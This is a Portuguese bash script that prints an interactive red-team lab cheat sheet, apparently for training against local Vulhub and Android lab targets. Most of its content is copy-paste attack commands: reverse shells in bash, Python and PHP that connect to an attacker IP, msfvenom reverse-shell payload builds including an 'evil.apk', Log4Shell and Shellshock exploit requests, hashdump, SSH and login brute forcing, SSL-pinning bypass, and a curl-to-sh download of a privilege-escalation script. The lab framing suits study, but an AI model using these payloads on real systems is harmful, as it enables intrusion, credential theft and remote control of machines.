#!/usr/bin/env bash
# =============================================================================
#  RED TEAM LAB — Cheatsheet Interativo
#  Execute: bash cheatsheet.sh
# =============================================================================

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

print_section() { echo -e "\n${BOLD}${CYAN}── $1 ──${NC}"; }
cmd() { echo -e "  ${GREEN}$1${NC}"; [[ -n "${2:-}" ]] && echo -e "    ${BLUE}# $2${NC}"; }

clear
cat << 'BANNER'
  ██████╗  ██████╗██╗  ██╗███████╗ █████╗ ████████╗███████╗██╗  ██╗███████╗███████╗████████╗
  ██╔════╝ ██╔════╝██║  ██║██╔════╝██╔══██╗╚══██╔══╝██╔════╝██║  ██║██╔════╝██╔════╝╚══██╔══╝
  ██║      ██║  ███╗███████║█████╗  ███████║   ██║   ███████╗███████║█████╗  █████╗     ██║
  ██║      ██║   ██║██╔══██║██╔══╝  ██╔══██║   ██║   ╚════██║██╔══██║██╔══╝  ██╔══╝     ██║
  ╚██████╗ ╚██████╔╝██║  ██║███████╗██║  ██║   ██║   ███████║██║  ██║███████╗███████╗   ██║
   ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝

                             🔴  Red Team Lab — Referência Rápida  🔴
BANNER

while true; do
    echo ""
    echo -e "${BOLD}Módulos disponíveis:${NC}"
    echo -e "  ${YELLOW}1${NC}) Reconhecimento e Scanning"
    echo -e "  ${YELLOW}2${NC}) Metasploit Framework"
    echo -e "  ${YELLOW}3${NC}) Vulhub / CVEs"
    echo -e "  ${YELLOW}4${NC}) Android Lab"
    echo -e "  ${YELLOW}5${NC}) Web Application Testing"
    echo -e "  ${YELLOW}6${NC}) Password Cracking"
    echo -e "  ${YELLOW}7${NC}) Post-Exploitation"
    echo -e "  ${YELLOW}8${NC}) Shells e Listeners"
    echo -e "  ${YELLOW}9${NC}) CVEs Rápidos (copiar e colar)"
    echo -e "  ${YELLOW}0${NC}) Sair"
    echo ""
    read -rp "Escolha um módulo: " choice

    case "$choice" in
        1)
            print_section "RECONHECIMENTO E SCANNING"
            cmd "nmap -sn 192.168.56.0/24" "descobrir hosts na rede do lab"
            cmd "nmap -sV -sC -p- -T4 192.168.56.20" "scan completo com scripts"
            cmd "nmap --script vuln 192.168.56.20" "verificar vulnerabilidades"
            cmd "nmap -sU --top-ports 100 192.168.56.20" "scan UDP"
            echo ""
            cmd "netdiscover -r 192.168.56.0/24" "descoberta ARP"
            cmd "masscan -p1-65535 192.168.56.20 --rate=1000" "scan ultrarrápido"
            echo ""
            cmd "enum4linux -a 192.168.56.20" "enumerar SMB/Samba"
            cmd "smbclient -L //192.168.56.20 -N" "listar shares SMB"
            cmd "smbmap -H 192.168.56.20" "mapear shares SMB"
            echo ""
            cmd "gobuster dir -u http://192.168.56.20 -w /usr/share/wordlists/dirb/common.txt" "brute force de diretórios"
            cmd "nikto -h http://192.168.56.20" "scan de vulnerabilidades web"
            cmd "whatweb http://192.168.56.20" "fingerprinting de tecnologias"
            ;;
        2)
            print_section "METASPLOIT FRAMEWORK"
            cmd "msfconsole -q" "iniciar MSF sem banner"
            cmd "msfdb init" "inicializar banco de dados"
            echo ""
            echo -e "  ${BOLD}Dentro do msfconsole:${NC}"
            cmd "search cve:2021-44228" "buscar por CVE"
            cmd "search type:exploit name:struts" "buscar exploits"
            cmd "use exploit/multi/http/log4shell_header_injection" "usar módulo"
            cmd "show options" "ver opções do módulo"
            cmd "set RHOSTS 192.168.56.20" "configurar alvo"
            cmd "set LHOST 192.168.56.10" "configurar atacante"
            cmd "run / exploit" "executar"
            echo ""
            cmd "sessions -l" "listar sessões"
            cmd "sessions -i 1" "interagir com sessão"
            cmd "background" "colocar sessão em background"
            echo ""
            echo -e "  ${BOLD}msfvenom — Gerar payloads:${NC}"
            cmd "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f elf -o shell.elf"
            cmd "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f exe -o shell.exe"
            cmd "msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -o evil.apk"
            cmd "msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f raw -o shell.php"
            ;;
        3)
            print_section "VULHUB / CVEs"
            cmd "vulhub list" "listar todos os CVEs"
            cmd "vulhub list struts" "filtrar por nome"
            cmd "vulhub start log4j/CVE-2021-44228" "subir ambiente"
            cmd "vulhub status" "ver containers ativos"
            cmd "vulhub stop log4j/CVE-2021-44228" "parar ambiente"
            cmd "vulhub reset" "parar todos os containers"
            echo ""
            echo -e "  ${BOLD}CVEs recomendados para estudo:${NC}"
            echo -e "  ${GREEN}Iniciante:${NC}"
            cmd "vulhub start bash/CVE-2014-6271" "Shellshock"
            cmd "vulhub start struts2/CVE-2017-5638" "Apache Struts RCE"
            cmd "vulhub start log4j/CVE-2021-44228" "Log4Shell"
            echo -e "  ${YELLOW}Intermediário:${NC}"
            cmd "vulhub start spring/CVE-2022-22965" "Spring4Shell"
            cmd "vulhub start sudo/CVE-2021-3156" "Baron Samedit LPE"
            cmd "vulhub start weblogic/CVE-2019-2725" "WebLogic RCE"
            cmd "vulhub start redis/CVE-2022-0543" "Redis LPE"
            ;;
        4)
            print_section "ANDROID LAB"
            cmd "android-lab devices" "listar dispositivos/emuladores"
            cmd "android-lab frida-server" "iniciar Frida Server no emulador"
            cmd "android-lab install-apps" "instalar APPs vulneráveis"
            cmd "android-lab mobsf" "iniciar MobSF"
            cmd "android-lab bypass-ssl com.app.nome" "bypass SSL Pinning"
            echo ""
            echo -e "  ${BOLD}ADB:${NC}"
            cmd "adb devices" "listar dispositivos"
            cmd "adb shell" "shell interativo"
            cmd "adb install app.apk" "instalar APK"
            cmd "adb pull /data/data/com.app/files/ ." "extrair dados"
            cmd "adb logcat | grep -i senha" "monitorar logs"
            echo ""
            echo -e "  ${BOLD}Análise de APK:${NC}"
            cmd "apktool d app.apk -o saida/" "descompilar APK"
            cmd "jadx -d saida/ app.apk" "decompilação para Java"
            cmd "grep -r 'password\\|api_key\\|secret' saida/" "buscar segredos"
            echo ""
            echo -e "  ${BOLD}Frida:${NC}"
            cmd "frida-ps -U" "listar processos"
            cmd "frida -U -f com.app.nome -l script.js" "injetar script"
            cmd "objection -g com.app explore" "exploração interativa"
            ;;
        5)
            print_section "WEB APPLICATION TESTING"
            echo -e "  ${BOLD}SQLMap:${NC}"
            cmd "sqlmap -u 'http://alvo/page?id=1' --dbs" "descobrir bancos"
            cmd "sqlmap -u 'http://alvo/page?id=1' -D dbname --tables"
            cmd "sqlmap -u 'http://alvo/page?id=1' -D dbname -T users --dump"
            cmd "sqlmap -r request.txt --level=5 --risk=3" "usar request do Burp"
            echo ""
            echo -e "  ${BOLD}Brute Force:${NC}"
            cmd "hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.20 ssh"
            cmd "hydra -l admin -P rockyou.txt 192.168.56.20 http-post-form '/login.php:user=^USER^&pass=^PASS^:Invalid'"
            cmd "ffuf -u http://alvo/FUZZ -w /usr/share/wordlists/dirb/common.txt" "fuzzing de paths"
            cmd "ffuf -u http://alvo/ -H 'Host: FUZZ.alvo.com' -w subdomains.txt" "fuzzing de vhosts"
            echo ""
            echo -e "  ${BOLD}Burp Suite:${NC}"
            echo -e "    ${BLUE}# Configurar proxy: 127.0.0.1:8080${NC}"
            cmd "curl -x http://127.0.0.1:8080 http://alvo/" "usar proxy Burp no curl"
            ;;
        6)
            print_section "PASSWORD CRACKING"
            cmd "john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt" "quebrar hash"
            cmd "john hash.txt --format=md5 --wordlist=rockyou.txt"
            cmd "john --show hash.txt" "mostrar senhas quebradas"
            echo ""
            cmd "hashcat -m 0 hash.txt rockyou.txt" "MD5"
            cmd "hashcat -m 1000 hash.txt rockyou.txt" "NTLM"
            cmd "hashcat -m 1800 hash.txt rockyou.txt" "SHA-512 (Linux)"
            cmd "hashcat -a 3 -m 0 hash.txt '?l?l?l?l?d?d'" "ataque de máscara"
            echo ""
            cmd "hash-identifier" "identificar tipo de hash"
            ;;
        7)
            print_section "POST-EXPLOITATION"
            echo -e "  ${BOLD}No Meterpreter:${NC}"
            cmd "sysinfo" "informações do sistema"
            cmd "getuid" "usuário atual"
            cmd "getsystem" "tentar escalar privilégios"
            cmd "hashdump" "extrair hashes (requer root)"
            cmd "run post/multi/recon/local_exploit_suggester" "sugerir exploits locais"
            cmd "upload /path/local /path/remoto" "enviar arquivo"
            cmd "download /path/remoto" "baixar arquivo"
            cmd "shell" "abrir shell do OS"
            echo ""
            echo -e "  ${BOLD}Linux Privilege Escalation:${NC}"
            cmd "sudo -l" "verificar sudo"
            cmd "find / -perm -4000 2>/dev/null" "binários SUID"
            cmd "cat /etc/crontab" "tarefas agendadas"
            cmd "ss -tulpn" "portas abertas"
            cmd "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh" "LinPEAS"
            ;;
        8)
            print_section "SHELLS E LISTENERS"
            echo -e "  ${BOLD}Listeners:${NC}"
            cmd "nc -lvnp 4444" "Netcat listener"
            cmd "msfconsole -q -x 'use multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 192.168.56.10; set LPORT 4444; run'"
            echo ""
            echo -e "  ${BOLD}Reverse Shells (executar no alvo):${NC}"
            cmd "bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'" "Bash"
            cmd "python3 -c \"import socket,os,pty;s=socket.socket();s.connect(('192.168.56.10',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')\""
            cmd "php -r '\$s=fsockopen(\"192.168.56.10\",4444);\$proc=proc_open(\"/bin/sh\",array(0=>\$s,1=>\$s,2=>\$s),\$pipes);'"
            echo ""
            echo -e "  ${BOLD}Estabilizar shell:${NC}"
            cmd "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'" "1. spawn PTY"
            echo -e "    ${BLUE}# 2. Ctrl+Z (background shell)${NC}"
            cmd "stty raw -echo; fg" "3. raw mode"
            cmd "export TERM=xterm; stty rows 50 columns 200" "4. ajustar tamanho"
            ;;
        9)
            print_section "CVEs RÁPIDOS — COPIAR E COLAR"
            echo ""
            echo -e "  ${BOLD}Log4Shell (CVE-2021-44228):${NC}"
            cmd "vulhub start log4j/CVE-2021-44228"
            cmd "# Payload: \${jndi:ldap://192.168.56.10:1389/exploit}"
            cmd "curl -H 'X-Api-Version: \${jndi:ldap://192.168.56.10:1389/a}' http://127.0.0.1:8080/"
            echo ""
            echo -e "  ${BOLD}Shellshock (CVE-2014-6271):${NC}"
            cmd "vulhub start bash/CVE-2014-6271"
            cmd "curl -H 'User-Agent: () { :; }; echo; /bin/cat /etc/passwd' http://127.0.0.1:8080/cgi-bin/test.cgi"
            echo ""
            echo -e "  ${BOLD}Struts2 (CVE-2017-5638):${NC}"
            cmd "vulhub start struts2/CVE-2017-5638"
            cmd "# Usar módulo MSF: exploit/multi/http/struts2_content_type_ognl"
            echo ""
            echo -e "  ${BOLD}Spring4Shell (CVE-2022-22965):${NC}"
            cmd "vulhub start spring/CVE-2022-22965"
            cmd "# Usar módulo MSF: exploit/multi/http/spring_framework_rce_spring4shell"
            ;;
        0)
            echo -e "\n${GREEN}Bons estudos! 🔴${NC}\n"
            exit 0
            ;;
        *)
            echo -e "${RED}Opção inválida${NC}"
            ;;
    esac

    echo ""
    read -rp "Pressione Enter para continuar..."
done
